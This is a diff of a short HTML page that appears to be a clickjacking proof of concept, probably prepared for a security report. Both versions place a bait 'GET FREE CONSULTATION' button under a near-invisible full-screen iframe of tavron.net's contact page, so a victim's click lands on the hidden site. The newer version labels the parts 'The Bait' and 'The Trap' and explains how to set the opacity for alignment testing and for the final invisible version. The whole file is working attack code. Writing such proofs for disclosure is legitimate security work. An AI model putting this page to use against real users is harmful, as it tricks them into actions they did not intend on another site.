@@ -1,76 +1,61 @@
 <!DOCTYPE html>
-<html lang="en" style="background: rgba(255, 255, 255, 0.1);">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            border: 0;
-        }
-
-        html {
-            background: rgba(255, 255, 255, 0.1) !important;
-            background-color: rgba(255, 255, 255, 0.1) !important;
-        }
-
         body {
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.1) !important;
-            background-color: rgba(255, 255, 255, 0.1) !important;
-            overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.1);
+            margin: 0;
+            padding-top: 100px;
         }
 
-        /* Tavron-styled button only */
-        .special-offer-button {
-            position: fixed;
-            bottom: 300px;
+        /* 1. The Fake Button (The Bait) */
+        .fake-button {
+            position: absolute;
+            top: 250px; /* Adjust this to align exactly under the target button */
             left: 50%;
             transform: translateX(-50%);
-            padding: 16px 45px;
+            padding: 20px 40px;
             background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
             color: white;
-            font-size: 18px;
-            font-weight: 700;
+            font-size: 24px;
+            font-weight: bold;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
-            z-index: 999;
-            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.4);
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
+            z-index: 1; /* Stays underneath the iframe */
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
 
-        .special-offer-button:hover {
+        .fake-button:hover {
             background: linear-gradient(135deg, #218838 0%, #155724 100%);
-            transform: translateX(-50%) translateY(-2px);
-            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.5);
         }
 
-        .overlay-iframe {
-            position: fixed;
-            top: 0;
+        /* 2. The Target Application (The Trap) */
+        .target-iframe {
+            position: absolute;
+            top: 0; 
             left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.0001;
-            z-index: 1000;
+            width: 100vw;
+            height: 100vh;
+            
+            /* CRITICAL: Set to 0.5 for testing alignment. 
+               Set to 0.0001 for the final report to make it invisible but clickable. */
+            opacity: 0.0001; 
+            
+            z-index: 2; /* Sits directly ON TOP of the fake button */
             border: none;
-            pointer-events: auto;
         }
     </style>
 </head>
 <body>
 
-    <!-- GET FREE CONSULTATION BUTTON ONLY -->
-    <button class="special-offer-button">GET FREE CONSULTATION</button>
-    
-    <!-- Invisible Iframe Overlay -->
-    <iframe class="overlay-iframe" src="https://tavron.net/contact.html"></iframe>
+    <button class="fake-button">GET FREE CONSULTATION</button>
+
+    <iframe class="target-iframe" src="https://tavron.net/contact.html"></iframe>
 
 </body>
 </html>
